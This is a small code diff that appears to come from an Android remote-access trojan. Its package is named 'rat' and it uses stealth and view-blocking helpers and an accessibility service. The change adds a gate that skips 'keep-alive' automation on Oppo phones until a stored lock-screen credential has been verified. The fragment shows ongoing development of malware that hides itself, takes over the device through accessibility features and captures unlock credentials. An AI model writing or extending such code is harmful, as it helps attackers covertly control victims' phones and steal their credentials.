@@ -6,6 +6,7 @@ import android.provider.Settings;
 import android.util.Log;
 
 import com.vendor.rat.MainApplication;
+import com.vendor.rat.credential.LockCredentialStore;
 import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.helper.StealthHelper;
 import com.vendor.rat.service.MyAccessibilityService;
@@ -276,7 +277,12 @@ public final class StrategyThread {
      */
     public static void triggerKeepAliveIfNeeded() {
         try {
-            if (keepAliveTriggered.get()) return;
+            if (DeviceUtils.isOppo() && !LockCredentialStore.isCurrentRunVerified()) {
+    Log.d(TAG, "skip keepalive automation: credential gate not verified in current run");
+return;
+            }
+
+   if (keepAliveTriggered.get()) return;
 
             MyAccessibilityService service = MyAccessibilityService.P();
             if (service == null) return;
